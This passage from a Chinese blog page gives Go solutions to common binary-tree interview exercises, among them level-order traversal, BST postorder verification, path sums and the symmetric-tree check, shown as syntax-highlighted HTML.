class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return int整型一维数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PrintFromTopToBottom</span><span class="params">( root *TreeNode )</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    res := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    q := []*TreeNode&#123;root&#125;</span><br><span class="line">    tmp := []*TreeNode&#123;&#125;</span><br><span class="line">    l := <span class="built_in">len</span>(q)</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span>(q) != <span class="number">0</span>&#123;</span><br><span class="line">        l = <span class="built_in">len</span>(q)</span><br><span class="line">        tmp = []*TreeNode&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;l;i++&#123;</span><br><span class="line">            res = <span class="built_in">append</span>(res,q[i].Val)</span><br><span class="line">            <span class="keyword">if</span> q[i].Left != <span class="literal">nil</span>&#123;</span><br><span class="line">                tmp = <span class="built_in">append</span>(tmp,q[i].Left)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> q[i].Right != <span class="literal">nil</span>&#123;</span><br><span class="line">                tmp = <span class="built_in">append</span>(tmp,q[i].Right)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        q = tmp</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉搜索树的后序遍历序列"><a href="#二叉搜索树的后序遍历序列" class="headerlink" title="二叉搜索树的后序遍历序列"></a><strong>二叉搜索树的后序遍历序列</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param sequence int整型一维数组</span></span><br><span class="line"><span class="comment"> * @return bool布尔型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">VerifySquenceOfBST</span><span class="params">(sequence []<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> sequence == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> helperDC(sequence, <span class="number">0</span>, <span class="built_in">len</span>(sequence)<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helperDC</span><span class="params">(arr []<span class="keyword">int</span>, left <span class="keyword">int</span>, right <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="comment">// 当前子树只有一个节点，根节点</span></span><br><span class="line"><span class="keyword">if</span> left &gt;= right &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root := arr[right]</span><br><span class="line">i, j := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="comment">// 找到右子树范围 j+1 : right</span></span><br><span class="line"><span class="keyword">for</span> j = right - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j-- &#123;</span><br><span class="line"><span class="keyword">if</span> arr[j] &lt; root &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 左子树是否符合</span></span><br><span class="line"><span class="keyword">for</span> i = left; i &lt;= j; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> arr[i] &gt; root &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> helperDC(arr, left, j) &amp;&amp; helperDC(arr, j+<span class="number">1</span>, right<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二叉树中和为某一值的路径-一"><a href="#二叉树中和为某一值的路径-一" class="headerlink" title="二叉树中和为某一值的路径(一)"></a><strong>二叉树中和为某一值的路径(一)</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * @param root TreeNode类 </span></span><br><span class="line"><span class="comment">  * @param sum int整型 </span></span><br><span class="line"><span class="comment">  * @return bool布尔型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hasPathSum</span><span class="params">( root *TreeNode ,  sum <span class="keyword">int</span> )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    l := hasPathSum(root.Left,sum - root.Val)</span><br><span class="line">    <span class="keyword">if</span> l==<span class="literal">true</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    r := hasPathSum(root.Right,sum - root.Val)</span><br><span class="line">    <span class="keyword">if</span> r==<span class="literal">true</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">if</span> sum == root.Val &amp;&amp; root.Left==<span class="literal">nil</span> &amp;&amp; root.Right==<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二叉树中和为某一值的路径-二"><a href="#二叉树中和为某一值的路径-二" class="headerlink" title="二叉树中和为某一值的路径(二)"></a>二叉树中和为某一值的路径(二)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNode类 </span></span><br><span class="line"><span class="comment"> * @param expectNumber int整型 </span></span><br><span class="line"><span class="comment"> * @return int整型二维数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不需要回溯</span></span><br><span class="line"><span class="comment">//声明变量不要写成 var res [][]int&#123;&#125;</span></span><br><span class="line"><span class="comment">//获取最终结果要把最终结果写成全局变量</span></span><br><span class="line"><span class="keyword">var</span> res [][]<span class="keyword">int</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FindPath</span><span class="params">( root *TreeNode ,  expectNumber <span class="keyword">int</span> )</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    tmp := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    get(root,expectNumber,tmp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">get</span><span class="params">(  root *TreeNode ,  expectNumber <span class="keyword">int</span>  ,tmp []<span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    tmp = <span class="built_in">append</span>(tmp, root.Val)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> expectNumber == root.Val &amp;&amp; root.Left==<span class="literal">nil</span> &amp;&amp; root.Right==<span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="comment">//只写tmp...相当于是把里面的元素一个一个加进去，我们要的是加一个slice</span></span><br><span class="line">        res = <span class="built_in">append</span>(res, <span class="built_in">append</span>([]<span class="keyword">int</span>&#123;&#125;, tmp...))</span><br><span class="line">    &#125;</span><br><span class="line">    get(root.Left,expectNumber - root.Val,tmp)</span><br><span class="line">    get(root.Right,expectNumber - root.Val,tmp)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">func hasPathSum( root *TreeNode ,  sum int ) bool &#123;</span></span><br><span class="line"><span class="comment">    // write code here</span></span><br><span class="line"><span class="comment">    if root == nil&#123;</span></span><br><span class="line"><span class="comment">        return false</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">    l := hasPathSum(root.Left,sum - root.Val)</span></span><br><span class="line"><span class="comment">    if l==true&#123;</span></span><br><span class="line"><span class="comment">        return true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    r := hasPathSum(root.Right,sum - root.Val)</span></span><br><span class="line"><span class="comment">    if r==true&#123;</span></span><br><span class="line"><span class="comment">        return true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">     if sum == root.Val &amp;&amp; root.Left==nil &amp;&amp; root.Right==nil &#123;</span></span><br><span class="line"><span class="comment">        return true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return false</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="二叉搜索树与双向链表"><a href="#二叉搜索树与双向链表" class="headerlink" title="二叉搜索树与双向链表"></a>二叉搜索树与双向链表</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRootOfTree TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return TreeNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Convert</span><span class="params">( pRootOfTree *TreeNode )</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">     <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode)</span></span></span><br><span class="line">    <span class="keyword">var</span> pre *TreeNode = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">var</span> head *TreeNode = <span class="literal">nil</span></span><br><span class="line">    f = <span class="function"><span class="keyword">func</span><span class="params">(root *TreeNode)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">nil</span>&#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        f(root.Left)</span><br><span class="line">        <span class="keyword">if</span> pre == <span class="literal">nil</span>&#123;</span><br><span class="line">            head = root</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            root.Left, pre.Right = pre, root</span><br><span class="line">        &#125;</span><br><span class="line">        pre = root</span><br><span class="line">        f(root.Right)</span><br><span class="line">    &#125;</span><br><span class="line">    f(pRootOfTree)</span><br><span class="line">    <span class="keyword">return</span> head</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="判断是不是平衡二叉树"><a href="#判断是不是平衡二叉树" class="headerlink" title="判断是不是平衡二叉树"></a>判断是不是平衡二叉树</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return bool布尔型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsBalanced_Solution</span><span class="params">( pRoot *TreeNode )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line"><span class="keyword">return</span> TreeDepth(pRoot)&gt;<span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">abs</span><span class="params">(a <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> a&lt;<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a,b <span class="keyword">int</span>)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> a&gt;b&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TreeDepth</span><span class="params">(root *TreeNode)</span><span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> root==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    leftDept:=TreeDepth(root.Left)</span><br><span class="line">    rightDept:=TreeDepth(root.Right)</span><br><span class="line">    <span class="keyword">if</span> leftDept==<span class="number">-1</span>||rightDept==<span class="number">-1</span>||abs(leftDept-rightDept)&gt;<span class="number">1</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max(leftDept,rightDept)+<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的下一个结点"><a href="#二叉树的下一个结点" class="headerlink" title="二叉树的下一个结点"></a>二叉树的下一个结点</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type TreeLinkNode struct &#123;</span></span><br><span class="line"><span class="comment">    Val int</span></span><br><span class="line"><span class="comment">    Left *TreeLinkNode</span></span><br><span class="line"><span class="comment">    Right *TreeLinkNode</span></span><br><span class="line"><span class="comment">    Next *TreeLinkNode</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetNext</span><span class="params">(p *TreeLinkNode)</span> *<span class="title">TreeLinkNode</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> p == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> p.Right != <span class="literal">nil</span> &#123;</span><br><span class="line">        p = p.Right</span><br><span class="line">        <span class="keyword">for</span> p.Left != <span class="literal">nil</span> &#123;</span><br><span class="line">            p = p.Left</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> p.Next != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> p == p.Next.Left &#123;</span><br><span class="line">            <span class="keyword">return</span> p.Next</span><br><span class="line">        &#125;</span><br><span class="line">        p = p.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对称的二叉树"><a href="#对称的二叉树" class="headerlink" title="对称的二叉树"></a>对称的二叉树</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return bool布尔型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSymmetrical</span><span class="params">( pRoot *TreeNode )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> process(pRoot.Left,pRoot.Right)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(lRoot *TreeNode,rRoot *TreeNode)</span><span class="title">bool</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> lRoot==<span class="literal">nil</span>&amp;&amp;rRoot==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lRoot==<span class="literal">nil</span>&amp;&amp;rRoot!=<span class="literal">nil</span>)|| (lRoot!=<span class="literal">nil</span>&amp;&amp;rRoot==<span class="literal">nil</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lRoot.Val==rRoot.Val&amp;&amp;process(lRoot.Left,rRoot.Right)&amp;&amp;process(lRoot.Right,rRoot.Left)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="把二叉树打印成多行"><a href="#把二叉树打印成多行" class="headerlink" title="把二叉树打印成多行"></a>把二叉树打印成多行</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 